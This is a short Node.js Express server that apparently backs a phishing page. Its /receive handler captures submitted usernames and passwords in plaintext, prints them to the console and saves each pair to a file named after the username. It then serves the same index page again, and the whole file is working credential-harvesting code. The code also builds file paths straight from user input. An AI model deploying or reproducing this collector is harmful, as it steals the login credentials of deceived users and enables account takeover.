var express = require('express'),
    fs = require('fs'),
    http = require('http'),
    https = require('https'),
    qs = require('qs');
var app = express();

app.post('/receive', function (request, respond) {
    var body = '';
    request.on('data', function (data) {
        body += data;
        var logs = String('username: ' + qs.parse(body).username + ' password: ' + qs.parse(body).password);
        console.log(logs);
        var writer = fs.createWriteStream('./data/' + qs.parse(body).username + '.txt');
        writer.write(logs);
        respond.sendfile('./dist/index.html')
    });
});

app.get("/", function (req, res) {
    res.sendfile('./dist/index.html')
});

app.get(/^(.+)$/, function (req, res) {
    res.sendfile(__dirname + '/dist' + req.params[0]);
});

var options = {
    key: fs.readFileSync('../2/server.key'),
    cert: fs.readFileSync('../2/server.crt'),
};

var httpServer = http.createServer(app);
var httpsServer = https.createServer(options, app);

httpServer.listen(8080);
httpsServer.listen(8880);